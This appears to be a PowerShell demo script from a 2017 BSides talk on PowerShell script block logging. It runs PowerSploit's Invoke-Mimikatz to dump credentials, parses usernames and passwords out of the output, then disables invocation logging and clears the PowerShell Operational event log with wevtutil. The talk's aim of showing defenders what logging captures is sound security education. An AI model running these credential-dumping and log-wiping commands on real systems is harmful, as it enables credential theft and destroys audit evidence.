# Setup logging
'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' | ForEach-Object {
    $null = New-Item $_ –Force -ErrorAction SilentlyContinue
    Set-ItemProperty $_ -Name EnableScriptBlockInvocationLogging -Value 1
    Set-ItemProperty $_ -Name EnableScriptBlockLogging -Value 1
}

# Install-Module PowerSploit
Get-Module -ListAvailable -Name PowerSploit
Import-Module PowerSploit

Get-Command -Module PowerSploit

Get-Help Invoke-Mimikatz -Examples
(Get-Help Invoke-Mimikatz -Examples).Examples.example[-1]

Invoke-Mimikatz

Get-Winevent -ListLog Microsoft-Windows-PowerShell/Operational

(Invoke-Mimikatz) -split '\n' | Select-String 'BSides' -Context 2

(Invoke-Mimikatz) -match '(?<User>.*)\n(?<Domain>.*)\n(?<Pass>.*?AmsBSides2017).*?\n'
'User','Pass' | % {$Matches.$_}

Get-Winevent -ListLog Microsoft-Windows-PowerShell/Operational | Select LogName,OldestRecordnumber

(1..5).ForEach{ Invoke-Mimikatz }

Get-Winevent -ListLog Microsoft-Windows-PowerShell/Operational | Select LogName,OldestRecordnumber

Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'
    Id = 4104
} | Select-Object -ExpandProperty Message

Set-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockInvocationLogging -Value 0
wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational"

Invoke-Mimikatz
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'
    Id = 4104
}

Invoke-Mimikatz
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'
    Id = 4104
} | Select-Object -Last 3 -ExpandProperty Message